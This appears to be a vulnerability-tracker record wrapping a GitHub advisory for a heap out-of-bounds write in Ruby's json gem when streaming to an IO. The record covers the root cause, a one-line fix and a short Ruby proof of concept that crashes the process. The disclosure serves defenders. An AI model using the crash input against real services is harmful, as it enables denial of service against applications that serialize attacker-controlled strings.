@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/278577938?v=4\", \"events_url\": \"https://api.github.com/users/susdrip/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/susdrip/followers\", \"following_url\": \"https://api.github.com/users/susdrip/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/susdrip/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/susdrip\", \"id\": 278577938, \"login\": \"susdrip\", \"node_id\": \"U_kgDOEJrDEg\", \"organizations_url\": \"https://api.github.com/users/susdrip/orgs\", \"received_events_url\": \"https://api.github.com/users/susdrip/received_events\", \"repos_url\": \"https://api.github.com/users/susdrip/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/susdrip/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/susdrip/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/susdrip\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54696\", \"cvss\": {\"score\": 3.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 3.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-122\", \"name\": \"Heap-based Buffer Overflow\"}, {\"cwe_id\": \"CWE-131\", \"name\": \"Incorrect Calculation of Buffer Size\"}, {\"cwe_id\": \"CWE-787\", \"name\": \"Out-of-bounds Write\"}], \"description\": \"### Summary\\n\\n`JSON.dump(obj, io)` and `JSON::State#generate(obj, io)` can write past the\\ninternal JSON generator buffer when a streamed object contains an\\nattacker-controlled string near 16 KB. The issue is a heap out-of-bounds write\\nin the IO-streaming path and is demonstrated as a reliable process crash /\\ndenial of service.\\n\\nThis was triaged on HackerOne as report #3785370. The issue was confirmed there\\nand I was asked to open it here.\\n\\n### Details\\n\\nRoot cause is in `ext/json/fbuffer/fbuffer.h`, `fbuffer_do_inc_capa()`.\\n\\nOn the IO path, the buffer is grown to `FBUFFER_IO_BUFFER_SIZE` (16383), but the\\nearly return checks total capacity instead of remaining capacity:\\n\\n```c\\nif (RB_UNLIKELY(fb->io)) {\\n    if (fb->capa < FBUFFER_IO_BUFFER_SIZE) {\\n        fbuffer_realloc(fb, FBUFFER_IO_BUFFER_SIZE);\\n    } else {\\n        fbuffer_flush(fb);\\n    }\\n\\n    if (RB_LIKELY(requested < fb->capa)) {\\n        return;\\n    }\\n}\\n```\\n\\nIf `fb->len` already contains JSON syntax bytes, and a string flush has\\n`16383 - fb->len <= requested < 16383`, this check returns even though there is\\nnot enough space left. `fbuffer_append_reserved()` then writes past the buffer:\\n\\n```c\\nMEMCPY(fb->ptr + fb->len, newstr, char, len);\\n```\\n\\nThe minimal fix is to compare against the remaining capacity:\\n\\n```diff\\n-        if (RB_LIKELY(requested < fb->capa)) {\\n+        if (RB_LIKELY(requested <= fb->capa - fb->len)) {\\n             return;\\n         }\\n```\\n\\n### PoC\\n\\n```ruby\\nrequire \\\"json\\\"\\nrequire \\\"stringio\\\"\\n\\nio = StringIO.new\\nbig = \\\"a\\\" * 16385\\nbig[16382] = '\\\"'          # escapable byte near the buffer boundary\\n\\nJSON.dump([big], io)\\n```\\n\\nVerified results:\\n\\n```text\\nRuby 4.0.5 / bundled json 2.18.0:\\nmalloc(): invalid size (unsorted)\\n.../json/common.rb:956: [BUG] Aborted\\n\\nruby/ruby master c78418b7a0 / json 2.19.8 / ASan:\\nheap-buffer-overflow WRITE of size 16382\\n  fbuffer_append_reserved  ext/json/fbuffer/fbuffer.h:145\\n  search_flush             ext/json/generator/generator.c:139\\n  convert_UTF8_to_JSON     ext/json/generator/generator.c:231\\n  raw_generate_json_string ext/json/generator/generator.c:922\\n  cState_m_generate        ext/json/generator/generator.c:1891\\n```\\n\\nControl: the same data through `JSON.dump([big])` without an IO argument returns\\nnormally. The bug is specific to the IO-streaming path.\\n\\n### Impact\\n\\nA remote attacker can trigger a heap out-of-bounds write if they control a\\nstring field that an application serializes through `JSON.dump(obj, io)` or\\n`JSON::State#generate(obj, io)`. The demonstrated impact is reliable denial of\\nservice. I am not claiming code execution or information disclosure.\", \"epss\": {\"percentage\": 0.00301, \"percentile\": 0.2184}, \"ghsa_id\": \"GHSA-x2f5-4prf-w687\", \"github_reviewed_at\": \"2026-07-23T19:48:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-x2f5-4prf-w687\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-x2f5-4prf-w687\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54696\"}], \"nvd_published_at\": \"2026-06-30T23:17:28Z\", \"published_at\": \"2026-07-23T19:48:08Z\", \"references\": [\"https://github.com/ruby/json/security/advisories/GHSA-x2f5-4prf-w687\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-54696\", \"https://github.com/ruby/json/commit/996bac686d64e4e3aaeae03b14a7f9ee9695ebdb\", \"https://github.com/ruby/json/releases/tag/v2.19.9\", \"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/json/CVE-2026-54696.yml\", \"https://github.com/advisories/GHSA-x2f5-4prf-w687\"], \"repository_advisory_url\": \"https://api.github.com/repos/ruby/json/security-advisories/GHSA-x2f5-4prf-w687\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/ruby/json\", \"summary\": \"Ruby json: JSON generator heap buffer overflow when streaming to an IO\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-23T19:48:08Z\", \"url\": \"https://api.github.com/advisories/GHSA-x2f5-4prf-w687\", \"vulnerabilities\": [{\"first_patched_version\": \"2.19.9\", \"package\": {\"ecosystem\": \"rubygems\", \"name\": \"json\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.9.0, < 2.19.9\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-x2f5-4prf-w687",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "json: >= 2.9.0, < 2.19.9"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54696"
+    ],
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "json"
+    ],
+    "remote": true,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-07-24T19:36:05.007056Z",
+  "provenance": {
+    "content_sha256": "78b0770300a717dc319a8382306bd6e9621d77fe116b5e500097ac5aedf8d55e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-23T19:48:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-x2f5-4prf-w687",
+  "status": "active",
+  "title": "Ruby json: JSON generator heap buffer overflow when streaming to an IO",
+  "updated_at": "2026-07-23T19:48:08Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-x2f5-4prf-w687"
+}
